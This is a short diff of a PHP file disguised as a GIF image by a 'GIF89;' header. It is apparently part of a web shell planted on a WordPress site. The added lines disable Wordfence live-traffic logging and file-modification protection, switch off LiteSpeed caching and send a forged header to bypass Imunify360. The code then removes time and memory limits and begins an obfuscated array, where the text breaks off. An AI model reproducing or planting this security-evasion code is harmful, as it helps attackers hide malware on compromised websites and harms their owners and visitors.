@@ -1,5 +1,27 @@
 GIF89;
-<?php
+<?=/**/@null; 
+// Disable LiteSpeed cache
+if (function_exists('litespeed_request_headers')) {
+    $headers = litespeed_request_headers();
+    if (isset($headers['X-LSCACHE'])) {
+        header('X-LSCACHE: off');
+    }
+}
+
+// Disable Wordfence live traffic and file modifications
+if (defined('WORDFENCE_VERSION')) {
+    define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
+    define('WORDFENCE_DISABLE_FILE_MODS', true);
+}
+
+// Bypass Imunify360 request
+if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
+    $imunifyHeaders = imunify360_request_headers();
+    if (isset($imunifyHeaders['X-Imunify360-Request'])) {
+        header('X-Imunify360-Request: bypass');
+    }
+}
+
 set_time_limit(0);
 ini_set('memory_limit', '-1');
 $ydLbyOjaJwMEe = array(
